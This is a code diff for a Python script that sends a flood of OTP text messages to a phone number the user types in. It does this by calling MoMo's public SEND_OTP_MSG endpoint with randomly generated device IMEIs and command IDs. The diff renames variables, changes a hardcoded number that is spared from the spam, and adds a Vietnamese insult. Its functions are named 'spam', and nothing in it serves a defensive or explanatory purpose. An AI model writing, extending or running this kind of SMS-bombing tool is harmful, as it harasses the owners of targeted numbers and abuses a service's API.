@@ -8,8 +8,8 @@ import hashlib, random ,time
 from fastapi import FastAPI 
 from time import sleep
 sdtspam=input ('Enter Momo : ')
-if sdt=='0328774559':
-    exit('spam cc')
+if sdtspam=="0904297518":
+ exit('Cút spam cc')
 def generateRandomString(length = 20) :
     characters = '0123456789abcdef'
     charactersLength = len(characters)
@@ -21,11 +21,12 @@ def generateRandomString(length = 20) :
     return randomString
 def generateImei() :
         return str(str(str(str(str(str(str(str(generateRandomString(8)) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(12));  
-def spam(sdt=sdtspam):
+def spam(phone=sdtspam):
+ import json
  time=random.randint(1000000000000,1999999999999)
  url="https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG"
  data={
-  "user":sdt,
+  "user":phone,
   "msgType": "SEND_OTP_MSG",
   "cmdId": f"{time}000000",
   "lang": "vi",
@@ -41,7 +42,7 @@ def spam(sdt=sdtspam):
   "errorDesc": "",
   "momoMsg": {
     "_class": "mservice.backend.entity.msg.RegDeviceMsg",
-    "number": sdt,
+    "number": phone,
     "imei": generateImei(),
     "cname": "Vietnam",
     "ccode": "084",
